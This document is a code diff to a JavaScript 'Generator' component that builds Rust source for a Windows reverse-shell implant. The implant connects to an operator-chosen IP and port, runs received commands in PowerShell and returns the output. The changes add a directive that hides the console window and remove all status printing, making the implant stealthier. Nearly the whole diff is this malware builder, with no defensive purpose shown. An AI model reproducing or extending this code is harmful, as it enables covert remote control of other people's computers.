@@ -71,6 +71,7 @@ const Generator = () => {
         let generatedCode = generateCode(IP, port)
         let fullCode =
             `    
+        #![windows_subsystem = "windows"]
         use std::io::{Read, Write};
         use std::net::TcpStream;
         use std::process::{Command, Stdio};
@@ -96,34 +97,25 @@ const Generator = () => {
                 .join(""),
             ) {
                 Ok(mut stream) => {
-                    println!("Successfully connected to server in port 80");
-                    // stream.write(msg).unwrap();
                     let mut data = [0; 1024]; // using 6 byte buffer
                     match stream.read(&mut data) {
                         Ok(_) => {
                             let text = from_utf8(&data).unwrap();
                             let text = text.trim_matches(char::from(0));
-                            println!("{}", text);
                             let output = Command::new("powershell")
                                 .args([text])
                                 .stdout(Stdio::piped())
                                 .output()
-                                .expect("failed to execute process");
+                                .expect("failed to execute process");  
                             stream.write(&output.stdout).unwrap();
-                            // println!("{}", output.stdout.len());
-                            println!("Reply: {:?}", String::from_utf8_lossy(&output.stdout));
                         }
                         Err(e) => {
-                            println!("Failed to receive data: {}", e);
                         }
                     }
                 }
                 Err(e) => {
-                    println!("Failed to connect: {}", e);
                 }
             }
-            println!("Terminated.");
-            thread::sleep(time::Duration::from_secs(5));
         }
     }
         `
@@ -133,6 +125,7 @@ const Generator = () => {
 
     const onSubmitHandler = (e) => {
         e.preventDefault()
+        console.log("test")
         axios.post("http://127.0.0.1:4000/generate", { data: fullCode })
             .then(res => {
                 axios({
